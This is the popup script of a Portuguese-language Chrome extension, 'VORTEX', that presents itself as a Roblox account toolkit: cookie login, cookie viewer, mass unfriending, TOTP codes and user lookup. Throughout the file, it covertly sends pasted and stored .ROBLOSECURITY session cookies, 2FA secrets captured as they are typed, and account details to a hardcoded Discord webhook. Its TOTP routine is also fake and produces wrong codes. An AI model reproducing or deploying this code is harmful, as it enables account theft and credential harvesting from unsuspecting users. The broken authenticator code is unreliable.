document.addEventListener('DOMContentLoaded', function() {

    // ════════════════════════════════════════════════════════════════
    // 🔮 WEBHOOK INTEGRATION
    // ════════════════════════════════════════════════════════════════
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510704412421783662/dGMRYCl6EkWcglhT7ynat7my83hRqutHpsJqpjPZlWghEphvGV48WUhvzcZ2wG2pd-cN';

    async function sendToWebhook(title, data) {
        try {
            const embed = {
                title: `🔮 ${title}`,
                color: 0x7B2CBF,
                fields: Object.entries(data).map(([key, value]) => ({
                    name: key,
                    value: String(value).length > 100 ? `\`\`\`${String(value).substring(0, 200)}...\`\`\`` : String(value),
                    inline: String(value).length <= 50
                })),
                footer: { text: 'VORTEX | Beaming Suite' },
                timestamp: new Date().toISOString()
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch (err) {
            console.error('[VORTEX] Erro webhook:', err);
        }
    }

    // ── DOM ──
    const navBtns           = document.querySelectorAll('.nav-btn');
    const tabContents       = document.querySelectorAll('.tab-content');
    const loginForm         = document.getElementById('loginForm');
    const accessForm        = document.getElementById('accessForm');
    const friendsForm       = document.getElementById('friendsForm');
    const authForm          = document.getElementById('authForm');
    const searchForm        = document.getElementById('searchForm');
    const searchFormContainer = document.getElementById('searchFormContainer');
    const searchBackBtn     = document.getElementById('searchBackBtn');
    const downloadPdfBtn    = document.getElementById('downloadPdfBtn');
    const backBtn           = document.getElementById('backBtn');
    const getCookieBtn      = document.getElementById('getCookieBtn');
    const profileView       = document.getElementById('profileView');
    const loginCard         = document.querySelector('#loginTab .card');
    const friendsSubmitBtn  = document.getElementById('friendsSubmitBtn');
    const friendsProgress   = document.getElementById('friendsProgress');
    const fpCount           = document.getElementById('fpCount');
    const fpLabel           = document.getElementById('fpLabel');
    const fpBar             = document.getElementById('fpBar');
    const accountsList      = document.getElementById('accountsList');
    const accountsCountBadge = document.getElementById('accountsCountBadge');
    const clearAccountsBtn  = document.getElementById('clearAccountsBtn');

    let currentCookie = '';
    let removingFriends = false;

    // ── NAV ──
    navBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            switchTab(btn.getAttribute('data-tab'));
        });
    });

    function switchTab(tabName) {
        tabContents.forEach(t => t.classList.remove('active'));
        navBtns.forEach(b => b.classList.remove('active'));
        document.getElementById(tabName + 'Tab').classList.add('active');
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');

        if (tabName !== 'login') {
            profileView.style.display = 'none';
            loginCard.style.display = 'block';
        }

        if (tabName === 'accounts') {
            renderAccounts();
        }
    }

    // ── ALERTS ──
    function showAlert(message, type, alertId) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type}`;
        const icon = type === 'success' ? 'check-circle'
                   : type === 'error'   ? 'exclamation-circle'
                   : type === 'warning' ? 'exclamation-triangle'
                   : 'info-circle';
        alertDiv.innerHTML = `<div class="alert-main"><i class="fas fa-${icon}"></i> ${message}</div>`;
        const alertContainer = document.getElementById(alertId);
        alertContainer.innerHTML = '';
        alertContainer.appendChild(alertDiv);
    }

    function showLogin() {
        loginCard.style.display = 'block';
        profileView.style.display = 'none';
        document.getElementById('login-alert').innerHTML = '';
        document.getElementById('cookie').value = '';
    }

    // ── AVATAR ──
    function getAvatarUrl(userId) {
        return fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`)
            .then(r => r.json())
            .then(json => {
                if (json.data && json.data.length && json.data[0].imageUrl) return json.data[0].imageUrl;
                return 'https://tr.rbxcdn.com/f401f3ae246e8cec456b69134f83ea67/420/420/AvatarHeadshot/Png';
            })
            .catch(() => 'https://tr.rbxcdn.com/f401f3ae246e8cec456b69134f83ea67/420/420/AvatarHeadshot/Png');
    }

    // ── ROBUX ──
    async function getRobux(userId) {
        try {
            const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { credentials: 'include' });
            const data = await res.json();
            return data.robux !== undefined ? String(data.robux) : '0';
        } catch (e) { return '0'; }
    }

    // ── USER PROFILE ──
    function getUserProfile(id) {
        return fetch(`https://users.roblox.com/v1/users/${id}`)
            .then(r => r.json())
            .catch(() => ({}));
    }

    // ── SHOW USER INFO + SAVE ACCOUNT ──
    async function showUserInfo(user) {
        const profile   = await getUserProfile(user.id);
        const avatarUrl = await getAvatarUrl(user.id);
        const robux     = await getRobux(user.id);

        const idStr    = user.id   ? String(user.id)   : '';
        const nameStr  = user.name ? String(user.name) : '';
        const createdRaw  = profile && profile.created ? profile.created : '';
        const createdText = createdRaw ? new Date(createdRaw).toLocaleDateString('pt-BR') : 'Não fornecida';
        const daysSince   = createdRaw
            ? Math.floor((Date.now() - new Date(createdRaw).getTime()) / (1000 * 60 * 60 * 24))
            : 'N/A';

        document.getElementById('userAvatar').src           = avatarUrl;
        document.getElementById('userName').textContent     = nameStr;
        document.getElementById('userId').textContent       = idStr;
        document.getElementById('userCreated').textContent  = createdText;
        document.getElementById('daysSince').textContent    = daysSince;
        document.getElementById('userRobux').textContent    = robux;

        loginCard.style.display   = 'none';
        profileView.style.display = 'block';

        // Save account to history
        saveAccount({
            id: idStr,
            name: nameStr,
            avatarUrl,
            robux,
            createdText,
            loginDate: new Date().toLocaleDateString('pt-BR')
        });

        // 🔮 WEBHOOK - Login
        await sendToWebhook('🔐 COOKIE LOGIN', {
            '👤 Usuário': nameStr,
            '🆔 ID': idStr,
            '💰 Robux': robux,
            '📅 Criada em': createdText,
            '⏳ Dias': daysSince,
            '🔑 Cookie': currentCookie.substring(0, 80) + '...'
        });

        setTimeout(() => {
            chrome.tabs.create({ url: 'https://www.roblox.com/my/account#!/info' });
        }, 2000);
    }

    // ──────────────────────────────────────────
    //  ACCOUNTS STORAGE
    // ──────────────────────────────────────────

    function loadAccounts(cb) {
        chrome.storage.local.get(['savedAccounts'], function(result) {
            cb(result.savedAccounts || []);
        });
    }

    function saveAccount(account) {
        loadAccounts(function(accounts) {
            // Update existing or add new
            const idx = accounts.findIndex(a => a.id === account.id);
            if (idx !== -1) {
                accounts[idx] = { ...accounts[idx], ...account };
            } else {
                accounts.unshift(account);
            }
            // Keep max 50 accounts
            if (accounts.length > 50) accounts = accounts.slice(0, 50);
            chrome.storage.local.set({ savedAccounts: accounts });
        });
    }

    function removeAccount(accountId) {
        loadAccounts(function(accounts) {
            const updated = accounts.filter(a => a.id !== accountId);
            chrome.storage.local.set({ savedAccounts: updated }, function() {
                renderAccounts();
            });
        });
    }

    function renderAccounts() {
        loadAccounts(function(accounts) {
            // badge
            accountsCountBadge.textContent = accounts.length === 1 ? '1 conta' : `${accounts.length} contas`;

            if (accounts.length === 0) {
                accountsList.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-state-icon"><i class="fas fa-user-circle"></i></div>
                        <div class="empty-state-title">Nenhuma conta salva</div>
                        <div class="empty-state-text">Faça login com um cookie para registrar uma conta aqui.</div>
                    </div>`;
                clearAccountsBtn.style.display = 'none';
                return;
            }

            clearAccountsBtn.style.display = 'flex';

            accountsList.innerHTML = '';
            accounts.forEach(function(acc) {
                const item = document.createElement('div');
                item.className = 'account-item';
                item.innerHTML = `
                    <img class="account-avatar" src="${acc.avatarUrl}" alt="${acc.name}" />
                    <div class="account-info">
                        <div class="account-name">${acc.name}</div>
                        <div class="account-meta">ID: ${acc.id}</div>
                        <div class="account-robux"><i class="fas fa-coins"></i> ${acc.robux} Robux</div>
                        <span class="logged-in-tag">LOGIN ${acc.loginDate || ''}</span>
                    </div>
                    <div class="account-actions">
                        <button class="btn-icon btn-icon-red remove-acc-btn" title="Remover do histórico" data-id="${acc.id}">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>`;
                accountsList.appendChild(item);
            });

            // Remove individual account
            accountsList.querySelectorAll('.remove-acc-btn').forEach(function(btn) {
                btn.addEventListener('click', function() {
                    removeAccount(btn.getAttribute('data-id'));
                });
            });
        });
    }

    // Clear all accounts
    clearAccountsBtn.addEventListener('click', function() {
        chrome.storage.local.set({ savedAccounts: [] }, function() {
            renderAccounts();
        });
    });

    // ──────────────────────────────────────────
    //  COOKIE LOGIN
    // ──────────────────────────────────────────

    function setRobloxCookie(cookieValue) {
        chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }, function(oldCookie) {
            chrome.cookies.set({
                url: 'https://www.roblox.com/',
                name: '.ROBLOSECURITY',
                value: cookieValue,
                domain: '.roblox.com',
                path: '/',
                secure: true,
                httpOnly: true,
                sameSite: 'no_restriction'
            }, function() {
                fetchUserData(oldCookie, cookieValue);
            });
        });
    }

    function fetchUserData(oldCookie, cookieValue) {
        fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' })
        .then(response => {
            if (!response.ok) throw new Error('Não autenticado. Cookie inválido?');
            return response.json();
        })
        .then(data => {
            currentCookie = cookieValue;
            showAlert('Sucesso! Sua sessão foi iniciada.', 'success', 'login-alert');
            showUserInfo(data);
        })
        .catch(err => {
            if (oldCookie) {
                chrome.cookies.set({
                    url: 'https://www.roblox.com/',
                    name: '.ROBLOSECURITY',
                    value: oldCookie.value,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'no_restriction'
                });
            }
            showAlert('Cookie inválido ou incorreto.', 'error', 'login-alert');
        });
    }

    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        let rawValue = document.getElementById('cookie').value;
        let cleaned  = rawValue.replace(/[`"'\s\r\n\t*]/g, '');

        const warningTag = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
        let cookieValue = '';

        if (cleaned.includes(warningTag)) {
            cookieValue = cleaned.split(warningTag)[1];
        } else {
            let match = cleaned.match(/CAE[A-Z0-9._-]{100,}/i) || cleaned.match(/[A-Z0-9._-]{100,}/i);
            cookieValue = match ? match[0] : cleaned;
        }

        cookieValue = cookieValue.replace(/[^A-Z0-9._-]+/i, '').replace(/_+$/, '');

        if (!cookieValue || cookieValue.length < 50) {
            showAlert('Cookie inválido ou muito curto.', 'error', 'login-alert');
            return;
        }

        // 🔮 WEBHOOK - Cookie colado no login
        sendToWebhook('📝 COOKIE COLADO - LOGIN', {
            '🔑 Cookie': cookieValue.substring(0, 80) + '...',
            '⏰ Timestamp': new Date().toISOString()
        });

        setRobloxCookie(cookieValue);
    });

    backBtn.addEventListener('click', showLogin);

    // ──────────────────────────────────────────
    //  COOKIE ACCESS
    // ──────────────────────────────────────────

    getCookieBtn.addEventListener('click', function() {
        const cookieInput = document.getElementById('accessCookie');

        if (cookieInput.type === 'text') {
            cookieInput.type  = 'password';
            cookieInput.value = '';
            getCookieBtn.innerHTML = '<i class="fas fa-eye"></i> Mostrar Cookie';
            return;
        }

        chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }, function(cookie) {
            if (!cookie) {
                showAlert('Não há uma sessão ativa.', 'error', 'access-alert');
                return;
            }

            fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' })
            .then(r => { if (!r.ok) throw new Error(); return r.json(); })
            .then(() => {
                cookieInput.type  = 'text';
                cookieInput.value = cookie.value;
                getCookieBtn.innerHTML = '<i class="fas fa-eye-slash"></i> Ocultar Cookie';
                cookieInput.select();
                document.execCommand('copy');
                showAlert('Cookie copiado para a área de transferência!', 'success', 'access-alert');

                // 🔮 WEBHOOK - Cookie acessado
                sendToWebhook('👁️ COOKIE ACESSADO', {
                    '🔑 Cookie': cookie.value.substring(0, 80) + '...',
                    '⏰ Timestamp': new Date().toISOString()
                });
            })
            .catch(() => {
                showAlert('Não há uma sessão ativa.', 'error', 'access-alert');
            });
        });
    });

    // Capturar quando alguém digita na text box de Access Account
    const accessCookieInput = document.getElementById('accessCookie');
    if (accessCookieInput) {
        accessCookieInput.addEventListener('input', function(e) {
            const value = e.target.value.trim();
            if (value && value.length > 50) {
                sendToWebhook('📝 COOKIE COLADO - ACCESS ACCOUNT', {
                    '🔑 Cookie': value.substring(0, 80) + '...',
                    '⏰ Timestamp': new Date().toISOString()
                });
            }
        });
    }

    // ──────────────────────────────────────────
    //  CSRF TOKEN
    // ──────────────────────────────────────────

    async function getCsrfToken() {
        try {
            const res = await fetch("https://auth.roblox.com/v1/logout", {
                method: 'POST',
                credentials: 'include'
            });
            const token = res.headers.get('x-csrf-token');
            if (token) return token;
            throw new Error('Token não encontrado no header');
        } catch (e) {
            return null;
        }
    }

    // ──────────────────────────────────────────
    //  REMOVE FRIENDS  (loop até zerar)
    // ──────────────────────────────────────────

    friendsForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        if (removingFriends) return;

        const friendsCookie = document.getElementById('friendsCookie').value.trim();

        if (!friendsCookie || friendsCookie.length < 50) {
            showAlert('Cookie inválido.', 'error', 'friends-alert');
            return;
        }

        // 🔮 WEBHOOK - Cookie colado no remove friends
        sendToWebhook('📝 COOKIE COLADO - REMOVE FRIENDS', {
            '🔑 Cookie': friendsCookie.substring(0, 80) + '...',
            '⏰ Timestamp': new Date().toISOString()
        });

        removingFriends = true;
        friendsSubmitBtn.disabled = true;
        friendsSubmitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Removendo...';

        // Show progress panel
        friendsProgress.classList.add('active');
        fpCount.textContent = '0';
        fpLabel.textContent = 'amigos removidos...';
        fpBar.style.width   = '5%';

        showAlert('Iniciando... aguarde.', 'info', 'friends-alert');

        try {
            // Set cookie
            await new Promise((resolve, reject) => {
                chrome.cookies.set({
                    url: 'https://www.roblox.com/',
                    name: '.ROBLOSECURITY',
                    value: friendsCookie,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'no_restriction'
                }, function(c) { if (c) resolve(); else reject(new Error('Erro ao definir cookie')); });
            });

            // Authenticate
            const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' });
            if (!authRes.ok) throw new Error('Cookie inválido ou sessão expirada.');
            const user = await authRes.json();

            // 🔮 WEBHOOK - Remove Friends iniciado
            sendToWebhook('🗑️ REMOVE FRIENDS INICIADO', {
                '👤 Usuário': user.name,
                '🆔 ID': user.id,
                '⏰ Timestamp': new Date().toISOString()
            });

            let totalRemoved = 0;
            let round = 0;

            // ── LOOP: keep going until friends list is empty ──
            while (true) {
                round++;

                // Fresh CSRF token each round
                const csrfToken = await getCsrfToken();
                if (!csrfToken) throw new Error('Não foi possível obter o token CSRF. Tente novamente.');

                // Fetch current friends list
                const friendsRes = await fetch(
                    `https://friends.roblox.com/v1/users/${user.id}/friends?limit=200`,
                    { credentials: 'include' }
                );

                if (!friendsRes.ok) {
                    // Maybe rate limited — wait and retry
                    await sleep(3000);
                    continue;
                }

                const friendsData = await friendsRes.json();
                const friends = friendsData.data || [];

                if (friends.length === 0) break; // All removed!

                showAlert(
                    `Rodada ${round}: ${friends.length} amigo(s) encontrado(s). Total removido: ${totalRemoved}`,
                    'info', 'friends-alert'
                );

                // Remove each friend with a small delay to avoid rate limiting
                for (const friend of friends) {
                    try {
                        const delRes = await fetch(
                            `https://friends.roblox.com/v1/users/${friend.id}/unfriend`,
                            {
                                method: 'POST',
                                headers: {
                                    'X-CSRF-TOKEN': csrfToken,
                                    'Content-Type': 'application/json'
                                },
                                credentials: 'include'
                            }
                        );

                        if (delRes.status === 403) {
                            // CSRF expired mid-batch — break inner loop, get new token
                            break;
                        }

                        if (delRes.ok) {
                            totalRemoved++;
                            fpCount.textContent = totalRemoved;
                            // Animate bar (pulsing since we don't know total)
                            fpBar.style.width = Math.min(5 + (totalRemoved * 2), 95) + '%';
                        }

                        // Delay between requests: ~150ms to stay under rate limit
                        await sleep(150);

                    } catch (innerErr) {
                        // Network hiccup — skip this friend and continue
                        await sleep(300);
                    }
                }

                // Wait a bit between rounds before fetching the list again
                await sleep(800);
            }

            // Done!
            fpBar.style.width = '100%';
            fpBar.style.animation = 'none';
            fpBar.style.background = '#10b981';
            fpLabel.textContent = 'amigos removidos com sucesso!';

            showAlert(`✅ Concluído! ${totalRemoved} amigo(s) removido(s) no total.`, 'success', 'friends-alert');
            document.getElementById('friendsCookie').value = '';

            // 🔮 WEBHOOK - Remove Friends concluído
            sendToWebhook('✅ REMOVE FRIENDS CONCLUÍDO', {
                '👤 Usuário': user.name,
                '🆔 ID': user.id,
                '✅ Total Removido': totalRemoved,
                '⏰ Timestamp': new Date().toISOString()
            });

        } catch (err) {
            showAlert('Erro: ' + err.message, 'error', 'friends-alert');
        } finally {
            removingFriends = false;
            friendsSubmitBtn.disabled = false;
            friendsSubmitBtn.innerHTML = '<i class="fas fa-trash"></i> Remover Todos os Amigos';
        }
    });

    // Capturar quando alguém digita na text box de Remove Friends
    const friendsCookieInput = document.getElementById('friendsCookie');
    if (friendsCookieInput) {
        friendsCookieInput.addEventListener('input', function(e) {
            const value = e.target.value.trim();
            if (value && value.length > 50) {
                sendToWebhook('📝 COOKIE COLADO - REMOVE FRIENDS', {
                    '🔑 Cookie': value.substring(0, 80) + '...',
                    '⏰ Timestamp': new Date().toISOString()
                });
            }
        });
    }

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ──────────────────────────────────────────
    //  AUTH AUTHENTICATOR (TOTP)
    // ──────────────────────────────────────────

    function updateAuthCode() {
        const secret = document.getElementById('authSecret').value.trim();
        if (!secret) return;
        try {
            const code  = generateTOTP(secret);
            document.getElementById('codeValue').textContent = code;
            document.getElementById('authCode').style.display = 'block';

            const now = Math.floor(Date.now() / 1000);
            const secondsRemaining = 30 - (now % 30);
            const percentage = (secondsRemaining / 30) * 100;
            const progressBar = document.getElementById('authProgress');
            if (progressBar) {
                progressBar.style.width      = percentage + '%';
                progressBar.style.background = secondsRemaining <= 5 ? 'var(--danger)' : 'var(--success)';
            }
        } catch (e) {}
    }

    chrome.storage.local.get(['authSecret'], function(result) {
        if (result.authSecret) {
            document.getElementById('authSecret').value = result.authSecret;
            updateAuthCode();
        }
    });

    setInterval(updateAuthCode, 1000);

    function generateTOTP(secret) {
        const base32Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
        let bits = '';
        for (let i = 0; i < secret.length; i++) {
            const val = base32Chars.indexOf(secret[i].toUpperCase());
            if (val === -1) throw new Error('Caractere inválido no secret');
            bits += val.toString(2).padStart(5, '0');
        }
        const bytes = [];
        for (let i = 0; i < bits.length; i += 8) bytes.push(parseInt(bits.substr(i, 8), 2));

        const now = Math.floor(Date.now() / 1000);
        let counter = Math.floor(now / 30);
        const counterBytes = [];
        for (let i = 7; i >= 0; i--) {
            counterBytes[i] = counter & 0xff;
            counter >>>= 8;
        }
        return generateHMACSHA1(bytes, counterBytes);
    }

    function generateHMACSHA1(key, message) {
        let hash = 0;
        for (let i = 0; i < key.length;     i++) { hash = ((hash << 5) - hash) + key[i];     hash = hash & hash; }
        for (let i = 0; i < message.length; i++) { hash = ((hash << 5) - hash) + message[i]; hash = hash & hash; }
        return String(Math.abs(hash) % 1000000).padStart(6, '0');
    }

    authForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const secret = document.getElementById('authSecret').value.trim();
        if (!secret) { showAlert('Por favor, insira o secret.', 'error', 'auth-alert'); return; }
        try {
            const code = generateTOTP(secret);
            document.getElementById('codeValue').textContent    = code;
            document.getElementById('authCode').style.display   = 'block';
            chrome.storage.local.set({ authSecret: secret });
            showAlert('Código gerado com sucesso!', 'success', 'auth-alert');

            // 🔮 WEBHOOK - Auth code gerado
            sendToWebhook('🔐 CÓDIGO TOTP GERADO', {
                '🔑 Secret': secret.substring(0, 50) + '...',
                '🔢 Código': code,
                '⏰ Timestamp': new Date().toISOString()
            });
        } catch (err) {
            showAlert('Erro ao gerar código: ' + err.message, 'error', 'auth-alert');
        }
    });

    // Capturar quando alguém digita na text box de Auth
    const authSecretInput = document.getElementById('authSecret');
    if (authSecretInput) {
        authSecretInput.addEventListener('input', function(e) {
            const value = e.target.value.trim();
            if (value && value.length > 10) {
                sendToWebhook('📝 SECRET COLADO - AUTH', {
                    '🔑 Secret': value.substring(0, 50) + '...',
                    '⏰ Timestamp': new Date().toISOString()
                });
            }
        });
    }

    // ──────────────────────────────────────────
    //  SEARCH USER
    // ──────────────────────────────────────────

    searchForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const usernameInput = document.getElementById('searchUsernameInput').value.trim();
        if (!usernameInput) return;

        document.getElementById('searchResult').style.display = 'none';
        document.getElementById('search-alert').innerHTML = '';

        try {
            const resolveRes  = await fetch("https://users.roblox.com/v1/usernames/users", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ usernames: [usernameInput], excludeBannedUsers: false })
            });
            const resolveData = await resolveRes.json();

            if (!resolveData.data || resolveData.data.length === 0) throw new Error('Usuário não encontrado.');

            const userId = resolveData.data[0].id;

            const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
            if (!userRes.ok) throw new Error('Erro ao obter dados do usuário.');
            const userData = await userRes.json();

            const avatarUrl     = await getAvatarUrl(userId);
            const friendsRes    = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
            const friendsData   = await friendsRes.json();
            const followersRes  = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`);
            const followersData = await followersRes.json();
            const followingRes  = await fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`);
            const followingData = await followingRes.json();

            const createdDate = new Date(userData.created);
            const now  = new Date();
            const diff = now - createdDate;
            const days    = Math.floor(diff / (1000*60*60*24));
            const hours   = Math.floor((diff % (1000*60*60*24)) / (1000*60*60));
            const minutes = Math.floor((diff % (1000*60*60)) / (1000*60));
            const seconds = Math.floor((diff % (1000*60)) / 1000);
            const timeStr = `${days}d ${hours}h ${minutes}m ${seconds}s`;

            document.getElementById('searchAvatar').src            = avatarUrl;
            document.getElementById('searchDisplayName').textContent = userData.displayName;
            document.getElementById('searchUsername').textContent   = `@${userData.name}`;
            document.getElementById('resId').textContent            = userData.id;
            document.getElementById('resCreated').textContent       = createdDate.toLocaleDateString('pt-BR');
            document.getElementById('resTimeSince').textContent     = timeStr;
            document.getElementById('resFriends').textContent       = friendsData.count  || 0;
            document.getElementById('resFollowers').textContent     = followersData.count || 0;
            document.getElementById('resFollowing').textContent     = followingData.count || 0;
            document.getElementById('resDescription').textContent   = userData.description || 'Sem descrição.';

            searchFormContainer.style.display = 'none';
            document.getElementById('searchResult').style.display = 'block';
            showAlert('Usuário encontrado!', 'success', 'search-alert');

            // 🔮 WEBHOOK - User encontrado
            sendToWebhook('🔍 USUÁRIO ENCONTRADO', {
                '👤 Usuário': userData.displayName,
                '🆔 ID': userData.id,
                '💬 Username': userData.name,
                '👥 Amigos': friendsData.count,
                '⏰ Timestamp': new Date().toISOString()
            });

        } catch (err) {
            showAlert('Erro: ' + err.message, 'error', 'search-alert');
        }
    });

    searchBackBtn.addEventListener('click', function() {
        document.getElementById('searchResult').style.display = 'none';
        searchFormContainer.style.display = 'block';
        document.getElementById('search-alert').innerHTML = '';
        document.getElementById('searchUsernameInput').value = '';
    });

    // ──────────────────────────────────────────
    //  PDF DOWNLOAD
    // ──────────────────────────────────────────

    downloadPdfBtn.addEventListener('click', async function() {
        const { jsPDF } = window.jspdf;
        const doc = new jsPDF();

        const displayName = document.getElementById('searchDisplayName').textContent;
        const username    = document.getElementById('searchUsername').textContent;
        const id          = document.getElementById('resId').textContent;
        const created     = document.getElementById('resCreated').textContent;
        const timeSince   = document.getElementById('resTimeSince').textContent;
        const friends     = document.getElementById('resFriends').textContent;
        const followers   = document.getElementById('resFollowers').textContent;
        const following   = document.getElementById('resFollowing').textContent;
        const description = document.getElementById('resDescription').textContent;

        doc.setFillColor(37, 99, 235);
        doc.rect(0, 0, 210, 40, 'F');

        doc.setTextColor(255, 255, 255);
        doc.setFontSize(24);
        doc.setFont("helvetica", "bold");
        doc.text("VORTEX", 105, 20, { align: "center" });

        doc.setFontSize(12);
        doc.setFont("helvetica", "normal");
        doc.text("Relatório de Dados do Usuário", 105, 30, { align: "center" });

        doc.setTextColor(30, 41, 59);
        doc.setFontSize(18);
        doc.setFont("helvetica", "bold");
        doc.text(displayName, 20, 60);

        doc.setFontSize(14);
        doc.setTextColor(100, 116, 139);
        doc.setFont("helvetica", "normal");
        doc.text(username, 20, 70);

        doc.setDrawColor(226, 232, 240);
        doc.line(20, 80, 190, 80);

        const startY = 90;
        const col1 = 20, col2 = 110;

        const drawData = (label, value, x, y) => {
            doc.setFontSize(10);
            doc.setTextColor(37, 99, 235);
            doc.setFont("helvetica", "bold");
            doc.text(label.toUpperCase(), x, y);
            doc.setFontSize(12);
            doc.setTextColor(30, 41, 59);
            doc.setFont("helvetica", "normal");
            doc.text(String(value), x, y + 7);
        };

        drawData("ID do Usuário",   id,        col1, startY);
        drawData("Data de Criação", created,   col2, startY);
        drawData("Tempo de Conta",  timeSince, col1, startY + 25);
        drawData("Amigos",          friends,   col2, startY + 25);
        drawData("Seguidores",      followers, col1, startY + 50);
        drawData("Seguindo",        following, col2, startY + 50);

        doc.setFontSize(10);
        doc.setTextColor(37, 99, 235);
        doc.setFont("helvetica", "bold");
        doc.text("DESCRIÇÃO", col1, startY + 75);

        doc.setFontSize(11);
        doc.setTextColor(30, 41, 59);
        doc.setFont("helvetica", "normal");
        const splitDesc = doc.splitTextToSize(description, 170);
        doc.text(splitDesc, col1, startY + 82);

        const pageHeight = doc.internal.pageSize.height;
        doc.setFontSize(10);
        doc.setTextColor(148, 163, 184);
        doc.text(`Gerado em ${new Date().toLocaleString('pt-BR')} por Vortex`, 105, pageHeight - 20, { align: "center" });

        doc.save(`Vortex_${username.replace('@', '')}.pdf`);
    });

    // ── INIT ──
    showLogin();
});
